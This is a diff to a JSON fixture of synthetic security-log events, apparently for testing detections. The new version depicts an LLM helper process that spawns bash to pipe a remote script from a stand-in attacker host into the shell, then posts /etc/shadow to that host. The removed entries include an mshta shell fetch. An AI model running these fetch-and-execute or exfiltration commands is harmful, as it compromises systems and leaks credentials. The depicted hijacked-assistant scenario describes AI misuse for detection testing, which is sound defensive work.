@@ -1,24 +1,41 @@
 [
   {
-    "timestamp": "2025-05-18T11:00:00",
-    "client_ip": "192.168.1.50",
-    "url": "http://attacker.site/prompt_injection",
-    "status": "TCP_MISS/200",
-    "source_type": "proxy",
-    "vendor": "squid"
+    "timestamp": "2025-05-18T09:35:17Z",
+    "source_type": "edr",
+    "vendor": "llmassist",
+    "username": "analyst1",
+    "src_ip": "192.168.1.55",
+    "process_name": "bash",
+    "command_line": "curl http://attacker.site/payload.sh | bash",
+    "parent_proc": "llm_helper",
+    "status": "executed"
   },
   {
-    "timestamp": "2025-05-18T11:00:10",
-    "process_name": "explorer.exe",
-    "command_line": "C:\\Users\\Victim\\Downloads\\exploit.doc",
+    "timestamp": "2025-05-18T09:35:19Z",
     "source_type": "edr",
-    "vendor": "velociraptor"
+    "vendor": "linux",
+    "username": "analyst1",
+    "src_ip": "192.168.1.55",
+    "dst_ip": "123.123.123.123",
+    "process_name": "curl",
+    "command_line": "curl http://attacker.site/payload.sh",
+    "parent_proc": "bash",
+    "protocol": "TCP",
+    "destination_port": 80,
+    "status": "connected"
   },
   {
-    "timestamp": "2025-05-18T11:00:20",
-    "process_name": "mshta.exe",
-    "command_line": "mshta.exe http://attacker.site/shell",
+    "timestamp": "2025-05-18T09:35:22Z",
     "source_type": "edr",
-    "vendor": "velociraptor"
+    "vendor": "linux",
+    "username": "analyst1",
+    "src_ip": "192.168.1.55",
+    "dst_ip": "123.123.123.123",
+    "process_name": "curl",
+    "command_line": "curl -X POST http://attacker.site/exfil --data '@/etc/shadow'",
+    "parent_proc": "bash",
+    "protocol": "TCP",
+    "destination_port": 80,
+    "status": "data_sent"
   }
 ]
